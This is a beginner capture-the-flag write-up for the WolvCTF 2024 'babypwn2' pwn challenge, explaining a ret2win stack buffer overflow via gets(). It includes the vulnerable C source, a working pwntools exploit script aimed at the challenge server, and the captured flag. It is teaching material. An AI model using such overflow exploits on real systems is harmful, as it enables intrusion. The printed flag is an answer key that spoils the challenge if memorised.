---
layout: writeup
category: Wolv-CTF-2024
chall_description:
points: 50
solves: 182
tags: pwn pwn/buffer-overflow pwn/ret2win pwn/gets
date: 2024-3-19
comments: false
---

A harder babypwn.  

`nc babypwn2.wolvctf.io 1337 `  

[babypwn2](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/Wolv-CTF-2024/beginner/babypwn2)  
[babypwn2.c](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/Wolv-CTF-2024/beginner/babypwn2.c)  

---

We're provided a binary ELF and a C source file. Here's the source:  

```c
#include <stdio.h>
#include <unistd.h>

/* ignore this function */
void ignore()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag() 
{
    char *args[] = {"/bin/cat", "flag.txt", NULL};
    execve(args[0], args, NULL);
}

int main() 
{
    ignore();
    char buf[0x20];
    printf("What's your name?\n>> ");
    gets(buf);
    printf("Hi %s!\n", buf);
    return 0;
}
```

Basically, the vulnerability here lies in the call to the `gets()` function in main().  gets() is well-known to be vulnerable, as it places no protections on buffer overflow/sending in too many bytes as input.  

Essentially, this is a classic ret2win challenge. For those of you unaware what this means, ret2win entails overriding the RIP, i.e. the return pointer. Basicaly, the RIP is located on the stack, and, at the end of main(), when the proram hits a `return` statement, the program will return to the location specified by RIP. However, because the RIP is located on the stack, attackers can override this value. We want to override the RIP with the return address of get_flag() so the program returns to get_flag() instead!  

To do this, we can easily use pwntools. I recommend beginners who solve these challenges without pwntools to try and switch to pwntools because it is much easier!  

```py
from pwn import *
import pwnlib.util.packing as pack

elf = ELF("./babypwn2")
context.binary = elf
context.log_level = "DEBUG"
context(terminal=["tmux","split-window", "-h"])

# p = process('./babypwn2')
# gdb.attach(p)

p = remote('babypwn2.wolvctf.io', 1337)

### IGNORE EVERYTHING ABOVE

# FIND RIP offset
# p.sendlineafter(b'>> ', cyclic(1024))

winaddr = elf.symbols['get_flag']
offset = cyclic_find('kaaalaaa')

p.sendlineafter(b'>> ', b'A'*offset + pack.p64(winaddr))

p.interactive()
```

First, we can find the offset of the RIP on the stack comapred to where the input is. We can do this by sending a cyclic of length 1024 (arbitrarily large). I'll skip over the fine details, but, essentially, you can think of the cyclic() function generates a sequence of characters such that every group of 4 characters will be unique. When the program inveitably throws a segmentation fault, once the RIP is overriden and it can't find the corresponding function since it is a random address, we can find the 8 characters it attempted to return to by checking the bytes at RSP, the stack pointer (points to the top of the stack). (Note that it is 8 instead of 4 because this is a 64-bit ELF, instead of a 32-bit ELF).  

If you're using standard GDB, we can do this by the command `x/qx $rsp`. I'm personally using pwndbg (and I would recommend you do so too!), which allows me to see all registers everytime the program stops.  

With pwndbg, we can clearly see that it's `kaaalaaa` (or by decoding from hex to ASCII from what you read in standard GDB). Now that we know this, we can use pwntools's `cyclic_find()` function to find the offset of this string in the generated cycle.  

Once we do that, we can simply find the address of the get_flag() function as seen above, then send some garbage bytes to fill the bytes in between the input and the RIP, and then send the packed value of the win address (because little-endianness requires us to send the reverse of the bytes).  

That's it. Running the program will now get you the flag!  

    wctf{Wo4h_l0ok_4t_y0u_h4ck1ng_m3}

### Sidenote
It is usually also standard to run `checksec` on the ELF, but I left it out since this is a writeup intended for beginners. This is a very useful tool for pwners, so if you're a beginner, I would recommend downloading it!  